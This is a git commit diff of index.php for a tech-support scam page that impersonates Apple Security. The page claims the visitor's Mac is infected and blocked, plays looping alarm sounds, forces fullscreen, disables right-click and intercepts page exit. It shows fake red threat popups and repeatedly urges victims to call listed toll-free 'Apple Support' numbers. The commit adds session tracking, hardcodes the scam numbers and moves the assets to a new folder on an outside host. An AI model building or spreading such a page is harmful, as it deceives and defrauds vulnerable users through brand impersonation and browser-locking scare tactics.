01aea3f0288f28fda331b8fde7d8e967522d1e63
omedia7872 <157737114+omedia7872@users.noreply.github.com>
2024-02-20 17:54:07 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -5,12 +7,12 @@
   <!-- Required meta tags -->
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>Apple-Support Final Warning</title>
-<link rel="stylesheet" href="https://shaneebonnerecipe.com/winimg/styles.css">
-<script type="text/javascript" src="https://shaneebonnerecipe.com/winimg/scripts.js"></script>
-<script type="text/javascript" src="https://shaneebonnerecipe.com/winimg/custom.js"></script>
-<script type="text/javascript" src="https://shaneebonnerecipe.com/winimg/main.js"></script>
-<link rel="icon" type="image/png" href="https://shaneebonnerecipe.com/winimg/apple.png">
+<title>Apple-Support assistance</title>
+<link rel="stylesheet" href="https://shaneebonnerecipe.com/monkey/styles.css">
+<script type="text/javascript" src="https://shaneebonnerecipe.com/monkey/scripts.js"></script>
+<script type="text/javascript" src="https://shaneebonnerecipe.com/monkey/custom.js"></script>
+<script type="text/javascript" src="https://shaneebonnerecipe.com/monkey/main.js"></script>
+<link rel="icon" type="image/png" href="https://shaneebonnerecipe.com/monkey/apple.png">
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
@@ -25,6 +27,8 @@
 
   gtag('config', 'G-JNCVPNG0V6');
 </script>
+<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=2493d6ba"></script>
+
 
 
 <style>
@@ -82,6 +86,7 @@ window.onbeforeunload = function() {
             });
         </script>
 
+
         <script>
               function getVariableFromURl(n0me)
               {
@@ -98,19 +103,15 @@ window.onbeforeunload = function() {
 
 
           <script type="text/javascript">
-                      var phone_number = getVariableFromURl('phone_number');
+                      var ph0ne = getVariableFromURl('ph0ne');
                   </script>
 
-
-                  <script type="text/javascript">
-                          var phone_number = '+1-888-983-4720';
-                      </script>
 
 </head>
 <body id="mycanvas" onclick="playSound()" >
 
   <div class="bg" style="cursor:none;">
-    <div class="bgimg" style="top: 0px;"><img src="https://shaneebonnerecipe.com/winimg/bg.png" alt="" width="100%"/></div>
+    <div class="bgimg" style="top: 0px;"><img src="https://shaneebonnerecipe.com/monkey/bg.png" alt="" width="100%"/></div>
 
 </div>
   <a  onclick="openFullscreen();" rel="noreferrer" id="link_black">
@@ -119,7 +120,7 @@ window.onbeforeunload = function() {
 
 <div class="box" id="box">
 <div class="top">
-<p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img src="https://shaneebonnerecipe.com/winimg/minimize.jpeg" class="" style="float: right; width:115px;"></p>
+<p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img src="https://shaneebonnerecipe.com/monkey/minimize.jpeg" class="" style="float: right; width:115px;"></p>
 </div>
 
 <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">Safety at a glance</h4>
@@ -128,14 +129,14 @@ window.onbeforeunload = function() {
 <ul>
 <li>
 <br>
-<img src="https://shaneebonnerecipe.com/winimg/kxFy-clip.png" width="50px;">
+<img src="https://shaneebonnerecipe.com/monkey/kxFy-clip.png" width="50px;">
 <p>Apple Security Protection</p>
 <p style="top: 103px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to check for <br>threats.</p>
 
 </li>
 <li>
 <br><br>
-<img src="https://shaneebonnerecipe.com/winimg/qsbs-firewall.png" width="60px;">
+<img src="https://shaneebonnerecipe.com/monkey/qsbs-firewall.png" width="60px;">
 <p>Firewall and network protection</p>
 <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
 </li>
@@ -143,19 +144,19 @@ window.onbeforeunload = function() {
 <ul>
 <li>
 <br>
-<img src="https://shaneebonnerecipe.com/winimg/s-S4-acc.png" width="60px;">
+<img src="https://shaneebonnerecipe.com/monkey/s-S4-acc.png" width="60px;">
 <p>Account protection</p>
 <p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
 </li>
 <li>
 <br>
-<img src="https://shaneebonnerecipe.com/winimg/Z5BR-network.png" width="51px;"/>
+<img src="https://shaneebonnerecipe.com/monkey/Z5BR-network.png" width="51px;"/>
 <p>Application and browser control</p>
 <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
 </li>
 </ul>
 </div>
-<img src="https://shaneebonnerecipe.com/winimg/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<img src="https://shaneebonnerecipe.com/monkey/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
 <br>
 </div>
 
@@ -163,16 +164,16 @@ window.onbeforeunload = function() {
 <!--Apple Security Quick Scan-->
 <div class="scan" id="scan">
   <div class="top">
-  <p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img src="https://shaneebonnerecipe.com/winimg/minimize.jpeg" class="" style="float: right; width:115px;"></p>
+  <p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img src="https://shaneebonnerecipe.com/monkey/minimize.jpeg" class="" style="float: right; width:115px;"></p>
   </div>
-  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="https://shaneebonnerecipe.com/winimg/apple.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple Security Protection</h4>
+  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="https://shaneebonnerecipe.com/monkey/apple.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple Security Protection</h4>
   <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
 
 <h3 style="    position: absolute;
 right: 150px;
 top: 6px;
 font-weight: 500;
-font-size: 19px;" id="text12"><b><script>document.write(phone_number)</script>  (free security)</b></h3>
+font-size: 19px;" id="text12"><b>+1-888-871-6195  (free security)</b></h3>
 
   <div class="centerright">
 
@@ -182,7 +183,7 @@ font-size: 19px;" id="text12"><b><script>document.write(phone_number)</script>  
 
 
 
-  <div class="flex"> <img src="https://shaneebonnerecipe.com/winimg/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">current threat</p></div>
+  <div class="flex"> <img src="https://shaneebonnerecipe.com/monkey/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">current threat</p></div>
 
 
   <br><br>
@@ -204,7 +205,7 @@ font-size: 19px;" id="text12"><b><script>document.write(phone_number)</script>  
 
   <li>
 
-<div class="flex"><img src="https://shaneebonnerecipe.com/winimg/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;"><p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Virus & threat protection settings </p> </div>
+<div class="flex"><img src="https://shaneebonnerecipe.com/monkey/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;"><p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Virus & threat protection settings </p> </div>
 <p style="color: grey; font-size: 13px;">no action required</p>
 <p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
   </li>
@@ -246,7 +247,7 @@ font-size: 19px;" id="text12"><b><script>document.write(phone_number)</script>  
   </ul>
 
   </div>
-  <img src="https://shaneebonnerecipe.com/winimg/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <img src="https://shaneebonnerecipe.com/monkey/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
   <br>
   </div>
   <script>
@@ -293,7 +294,7 @@ margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
                    <p> Please contact Apple Support immediately to report this threat, prevent spoofing, and unlock access to this device. <br><br>
                     Closing this mac puts your personal information at risk and interrupts your mac registration.</p>
 
-               <p style="padding-bottom: 0px;">Call Apple Support <strong><script>document.write(phone_number)</script>  (Security Support)</strong></p>
+               <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-888-871-6195  (Security Support)</strong></p>
                <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">Have understood</a> <a class="" id="leave_page">To cancel</a> </div>
             </div>
 
@@ -301,9 +302,11 @@ margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
     </div>
 </div>
 <audio id="beep" loop>
-  <source src="https://shaneebonnerecipe.com/winimg/_Fm7-alert.mp3" type="audio/mpeg">
+  <source src="https://shaneebonnerecipe.com/monkey/_Fm7-alert.mp3" type="audio/mpeg">
 </audio>
-
+<audio id="beep2" loop>
+  <source src="https://shaneebonnerecipe.com/monkey/bleep-41488.mp3" type="audio/mpeg">
+</audio>
 <script>
   addEventListener("click", function() {
 var el = document.documentElement
@@ -314,16 +317,14 @@ var el = document.documentElement
 ;
 rfs.call(el);
 });
-$(document).bind("contextmenu", function(e) {
-    return false;
-});
+
 </script>
 
 <div id="websa" class="websa mnwebs">
   <div class="ilb top">
       <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
-          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://shaneebonnerecipe.com/winimg/apple.png" class="logo3"></span> Apple_Defender_Security_Center</span>
-          <span id="txts1" class="fl title2"><a href="#"><img src="https://shaneebonnerecipe.com/winimg/cross.png"></a></span>
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://shaneebonnerecipe.com/monkey/apple.png" class="logo3"></span> Apple_Defender_Security_Center</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="https://shaneebonnerecipe.com/monkey/cross.png"></a></span>
 
       </div>
   </div>
@@ -331,13 +332,13 @@ $(document).bind("contextmenu", function(e) {
               <span class="colo-rd">Application: Ads.financetrack(x07).dll<br>
                 Threats_Detected:Stuxnet. Unknown_Error_code: #0x6D09</span>
   </div>
-  <img id="banner" src="https://shaneebonnerecipe.com/winimg/virus-images.png">
+  <img id="banner" src="https://shaneebonnerecipe.com/monkey/virus-images.png">
   <div id="disclaimer">
     Access to this PC has been blocked for security reasons.<br>
-      <span class="support">Contact Apple Support: <script>document.write(phone_number)</script>  (Security Support)</span>
+      <span class="support">Contact Apple Support: +1-888-871-6195  (Security Support)</span>
   </div>
   <div id="bottom">
-      <img id="badge" src="https://shaneebonnerecipe.com/winimg/apple.png"><span class="title3">Apple Support</span>
+      <img id="badge" src="https://shaneebonnerecipe.com/monkey/apple.png"><span class="title3">Apple Support</span>
       <ul>
           <li>
               <a href="#">
@@ -365,7 +366,7 @@ $(document).bind("contextmenu", function(e) {
 
       <div class="col-md-12">
           <div class="right-foot" style="text-align: center;">
-              <span id="footertxt" style="font-weight: 700;"><img src="https://shaneebonnerecipe.com/winimg/apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone_number)</script>  (Security Support)</span></span>
+              <span id="footertxt" style="font-weight: 700;"><img src="https://shaneebonnerecipe.com/monkey/apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-871-6195  (Security Support)</span></span>
           </div>
       </div>
       <div class="col-md-12">
@@ -389,6 +390,60 @@ $(document).bind("contextmenu", function(e) {
 
 
 </div>
+<div id="mndiv" style="cursor:pointer;">
+<div class="modal exitModal" id="exitModal1" tabindex="-1" role="dialog" style="cursor:pointer">
+  <div class="modal-dialog modal-full-height modal-right" role="document">
+    <div class="modal-content" style="background-color: red;color: #fff;">
+      <img id="modal-exit" src="https://shaneebonnerecipe.com/bumbum/cross.png" class="modal-exit">
+      <div class="modal-body">
+        <div class="media">
+         
+          <div class="media-body" style="cursor:pointer;">
+            <h5 class="media-heading">Virus and threat protection</h5>
+            <h5>Threats found</h5>
+            <p>MAC Security Antivirus found threats. Get details.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal exitModal" id="exitModal2" tabindex="-1" role="dialog" style="cursor:pointer">
+  <div class="modal-dialog modal-full-height modal-right" role="document">
+    <div class="modal-content" style="background-color: red;color: #fff;">
+      <img id="modal-exit" src="https://shaneebonnerecipe.com/bumbum/cross.png" class="modal-exit">
+      <div class="modal-body">
+        <div class="media">
+          
+          <div class="media-body" style="cursor:pointer;">
+            <h5 class="media-heading">Firewall threat protection</h5>
+            <h5>MAC Security took action</h5>
+            <p>Your settings caused MAC Security Antivirus to block an app that may potentially perform unwanted actions on your device.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal exitModal" id="exitModal3" tabindex="-1" role="dialog" style="cursor:pointer">
+  <div class="modal-dialog modal-full-height modal-right" role="document">
+    <div class="modal-content" style="background-color: red;color: #fff;">
+      <img id="modal-exit" src="https://shaneebonnerecipe.com/bumbum/cross.png" class="modal-exit">
+      <div class="modal-body">
+        <div class="media" style="cursor:pointer;">
+          <div class="media-body">
+            <h4 class="media-heading">Call Apple Support <br/> +1-888-745-6832
+              (Security TollFree) </h4>
+            <p>Please contact us immediately. A technician will help you solve the problem.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
 
 <script>
   $(document).ready(function () {
@@ -396,6 +451,16 @@ $(document).bind("contextmenu", function(e) {
           $("#welcomeDiv").show();
       });
   });
+ 
+  $("#mycanvas").click(function(){
+  $("#mndiv").hide();
+  $(".black").hide();
+});
+ $(function() {
+            $(this).bind("contextmenu", function(e) {
+                e.preventDefault();
+            });
+        }); 
 </script>
 
  </body>
